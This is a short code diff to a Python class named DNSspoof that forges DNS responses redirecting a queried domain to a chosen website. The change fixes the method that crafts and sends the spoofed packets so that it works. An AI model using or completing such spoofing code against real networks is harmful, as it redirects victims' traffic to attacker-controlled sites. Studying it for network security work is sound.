@@ -68,8 +68,7 @@ class DNSspoof(object):
         DNSlayer = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, qr=1, aa=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self._website))
         return IPlayer/TCPlayer/DNSlayer
 
-    @staticmethod
-    def send_packet(pkt):
+    def send_packet(self, pkt):
         if pkt.haslayer(DNSQR):
             spoofed_packet = self.craft_packet(pkt)
             send(spoofed_packet)
